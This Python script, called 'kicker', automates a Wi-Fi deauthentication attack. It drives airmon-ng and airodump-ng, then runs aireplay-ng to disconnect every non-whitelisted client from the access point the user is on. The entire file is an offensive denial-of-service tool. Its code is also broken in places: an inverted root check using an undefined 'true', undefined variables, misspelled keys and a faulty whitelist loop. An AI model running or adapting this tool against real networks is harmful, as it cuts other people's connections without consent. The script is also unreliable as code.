#!/usr/bin/env python
# -*- coding: utf-8 -*- 



######################################
#  
#  kicker kick all non whitelisted wlans 
#  that are connected to the same bssid as you
#  you can force params but if you have
#  2 wlan interface everythin is automated
#
########################################

import subprocess
import os
import re
import time
import sys



process_tree = {}
wdata = {"defaults":{"channel":-1,"iface":-1,"essid":-1,"bssid":-1,"white_list_file":"whitelist"},"white_list":[]}
freqlist = ['2.412','2.417','2.422','2.427','2.432','2.437','2.442','2.447','2.452','2.457','2.462','2.467','2.472','2.484']
airsuite_path = ""
reglist = {
  "ifmac":re.compile('^\s*(wlan\d+)\s*.*(\w\w\W\w\w\W\w\w\W\w\w\W\w\w\W\w\w).*$'),
  "iwface":re.compile('^\s*(wlan\d+)\s*.*ESSID\W+(\w+).*$'),
  "iwmac":re.compile('^.*Frequency\W(\d\.\d+)\s*.*(\w\w\W\w\w\W\w\w\W\w\w\W\w\w\W\w\w).*$'),
  "airmon":re.compile('^\s*(mon\d)\s*.*$'),
  "fairmon":re.compile('^\s*(wlan\d)\s*.*$'),
  "airodump_mac":re.compile('^\s*(\w\w\W\w\w\W\w\w\W\w\w\W\w\w\W\w\w)\s+(\w\w\W\w\w\W\w\w\W\w\w\W\w\w\W\w\w).*$'),
  "normal_mac": re.compile('^.*(\w\w\W\w\w\W\w\w\W\w\w\W\w\w\W\w\w).*$'),
}
forced_params = False




def root():
	import os
	if os.geteuid() != 0:
		return true
	
def run_ifwconf():
  try : 
    ifconf = subprocess.Popen("ifconfig -a", \
          shell=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
    ifreturn_code = ifconf.wait()
    iwconf = subprocess.Popen("iwconfig", \
          shell=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
    iwreturn_code = iwconf.wait()
    t1 = {"proc":ifconfig,"retrun_code":ifreturn_code}
    t2 = {"proc":iwconf,"retrun_code":iwreturn_code}
    process_tree.update({"ifconfig":t1,"iwconfig":t2})
  except:
    return False
  if ( process_tree["ifconfig"]["return_code"] == 0 and process_tree["iwconfig"]["return_code"] == 0 ):
    return True
  else:
    return False

def get_interfaces_and_mac():
  found = False
  for line in process_tree["ifconfig"]["proc"].stdout:
    temp = reglist['ifmac'].match(line.rstrip())
    if temp != None:
      found = True
      wdata.update({temp.group(1):{"mac":temp.group(2),"channel":-1,"station":-1,"status":-1,"essid":-1})

      wdata["defaults"]["iface"] = temp.group(1)
      try:
        wdata["white_list"].index(temp.group(1))
      except:
        wdata["white_list"].append(temp.group(1))

      print("found %s -> %s" % (temp.group(1),temp.group(2)))    
  return found

def look_for_connected_ifaces_info():
  found = False
  grabnext = False
  for line in process_tree["iwconfig"]["proc"].stdout:
    if grabnext != False:
      tempmac = reglist['iwmac'].match(line.rstrip())
      wdata.update({grabnext:{"channel":freqlist.index(tempmac.group(1))+1,"station":tempmac.group(2)}})
      wdata["defaults"]["channel"] = wdata[grabnext]["channel"]
      wdata["defaults"]["bssid"] = tempmac.group(2)
      wdata["defaults"]["essid"] = wdata[grabnext]["essid"]
      print("%s is connected on %s using channel %s  and %s mac adress" % (grabnext,wdata[grabnext]["essid"],wdata[grabnext]["channel"],tempmac.group(2)))
      grabnext = False
    tempface = reglist['iwface'].match(line.rstrip())
    if tempface != None:
      if tempface.group(2) != "off":
        wdata.update({tempface.group(1):{"essid": tempface.group(2),"status":"connected"}})
        grabnext = tempface.group(1) #durty way to get next iteration i need to change that
        found = True
      else:
        wdata["defaults"]["iface"] = tempface.group(1)
  return True

def clear_and_start_monitor_mode():
  airmon = subprocess.Popen(airsuite_path + "airmon-ng", \
            shell=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
  airreturn_code = airmon.wait()
  process_tree.update({"airmon":{"proc":airmon,"return_code":airreturn_code}})
  for line in process_tree["airmon"]["proc"].stdout:
    temp = reglist["airmon"].match(line.rstrip())
    if temp != None:
      process_tree["airmon"]["proc"] = subprocess.Popen(airsuite_path + "airmon-ng stop " + temp.group(1), \
            shell=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
      process_tree["airmon"]["return_code"] = execution.wait()
      if process_tree["airmon"]["return_code"] == 0:
        print("Stoping monitoring interfaces %s " % (temp.group(1)))       
      else:
        return False
  for iface,data in wdata:
    process_tree["airmon"]["proc"] = subprocess.Popen(airsuite_path + "airmon-ng stop " + iface, \
            shell=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
    process_tree["airmon"]["return_code"] = process_tree["airmon"]["proc"].wait()
    if process_tree["airmon"]["return_code"] == 0:
      print("forcing stop monitoring on %s interfaces" % (iface))
    else:
      return False
  process_tree["airmon"]["proc"] = subprocess.Popen(airsuite_path + "airmon-ng start " + wdata["defaults"]["iface"] + " " + wdata["defaults"]["channel"], \
          shell=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
  process_tree["airmon"]["return_code"] = process_tree["airmon"]["proc"].wait()
  if process_tree["airmon"]["return_code"] == 0:
    print("starting monitoring on %s interface" % (wdata["defaults"]["iface"]))
    return True
  else:
    return False
 
def forced_clear_and_start_monitor_mode():

  airmon = subprocess.Popen(airsuite_path + "airmon-ng", \
            shell=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
  airreturn_code = airmon.wait()
  process_tree.update({"airmon":{"proc":airmon,"return_code":airreturn_code}})

  for line in process_tree["airmon"]["proc"].stdout:
    temp = reglist["airmon"].match(line.rstrip())
    if temp != None:
      process_tree["airmon"]["proc"] = subprocess.Popen(airsuite_path + "airmon-ng stop " + temp.group(1), \
            shell=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
      process_tree["airmon"]["return_code"] = execution.wait()
      if process_tree["airmon"]["return_code"] == 0:
        print("Stoping monitoring interfaces %s " % (temp.group(1)))       
      else:
        return False

  process_tree["airmon"]["proc"] = subprocess.Popen(airsuite_path + "airmon-ng", \
            shell=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
  process_tree["airmon"]["return_code"] = process_tree["airmon"]["proc"].wait()

  for line in process_tree["airmon"]["proc"].stdout:
    temp = reglist["fairmon"].match(line.rstrip())
    if temp != None:
      process_tree["airmon"]["proc"] = subprocess.Popen(airsuite_path + "airmon-ng stop " + temp.group(1), \
            shell=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
      process_tree["airmon"]["return_code"] = execution.wait()
      if process_tree["airmon"]["return_code"] == 0:
        print("Stoping monitoring interfaces %s " % (temp.group(1)))       
      else:
        return False
  
  process_tree["airmon"]["proc"] = subprocess.Popen(airsuite_path + "airmon-ng start " + wdata["defaults"]["iface"] + " " + wdata["defaults"]["channel"], \
          shell=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
  process_tree["airmon"]["return_code"] = process_tree["airmon"]["proc"].wait()
  if process_tree["airmon"]["return_code"] == 0:
    print("starting monitoring on %s interface" % (wdata["defaults"]["iface"]))
    return True
  else:
    return False


def main():

	

  if not root():
    exit("You need to have root privileges to run this script.\nPlease try again, this time using 'sudo'. Exiting.")
  if not run_ifwconf():
    exit("Something went wrong while executing ifconfig or iwconfig, subprocess unable to complete. exiting")

  if not forced_params:
    run_ifwconf()
    get_interfaces_and_mac()
    look_for_connected_ifaces_info()
    clear_and_start_monitor_mode()
  else:
    forced_clear_and_start_monitor_mode()



  # need to change that to some C bindings

  proc=subprocess.Popen(['airodump-ng',
                           '-c',wdata["defaults"]["channel"],'mon0'],
                          stdout=subprocess.PIPE,
                          stderr=subprocess.PIPE,
                          executable= airsuite_path + 'airodump-ng')

  time.sleep(2.5)

  for x in proc.stderr:
    a = reglist["airodump_mac"].match(x.rstrip())
    if a != None:
      for white_list in wdata["white_list"]:
        if ( a.group(1) == wdata["defaults"]["bssid"] and a.group(2) != white_list):       
          airmon = subprocess.Popen(airsuite_path + "aireplay-ng -0 1 -a "+ a.group(1) +" -c "+ a.group(2) + " --ignore-negative-one mon0", \
            shell=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
          airreturn_code = airmon.wait()
          if airreturn_code == 0:
            print("remouved -> %s  from -> %s  (%s)" % (a.group(2),wdata["defaults"]["bssid"],wdata["defaults"]["essid"]))
            time.sleep(2)
      sys.stdout.flush()


if __name__ == "__main__":
  if len(sys.argv) > 1:
    forced_params = True
    wdata["defaults"].update({"bssid":sys.argv[1],"essid":sys.argv[2],"channel":sys.argv[3],"iface":sys.argv[4],"white_list_file":sys.argv[5]})

  try:
    f = open(wdata["defaults"]["white_list_file"])
    for line in f:
      temp = reglist['normal_mac'].match(line.rstrip())
      if temp != None:
        wdata["white_list"].append(temp.group(1))
        print("%s added to the white list" % (temp.group(1)))
    f.close()
  except:
    print("no whitelist file loaded")
  main()
